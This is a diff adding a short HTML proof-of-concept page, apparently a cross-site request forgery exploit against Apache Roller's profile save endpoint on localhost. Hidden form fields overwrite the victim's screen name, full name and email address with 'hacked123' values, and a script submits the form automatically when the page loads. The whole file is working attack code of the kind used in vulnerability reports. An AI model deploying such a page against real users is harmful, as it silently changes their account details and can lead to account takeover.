@@ -1,0 +1,18 @@
+<html>
+</head>
+    <form id="exploitForm" action="http://localhost:8080/roller/roller-ui/profile!save.rol" method="POST">
+        <input name="bean.userName" value="vanlam" type="hidden">
+        <input name="bean.screenName" value="hacked123" type="hidden">
+        <input name="bean.fullName" value="hacked123" type="hidden">
+        <input name="bean.emailAddress" value="hacked123@gmail.com" type="hidden">
+        <input name="bean.passwordText" value="" type="hidden">
+        <input name="bean.passwordConfirm" value="" type="hidden">
+        <input name="bean.locale" value="vi_VN" type="hidden">
+        <input name="bean.timeZone" value="Asia/Bangkok" type="hidden">
+    </form>
+
+    <script>
+        document.getElementById('exploitForm').submit();
+    </script>
+</body>
+</html>
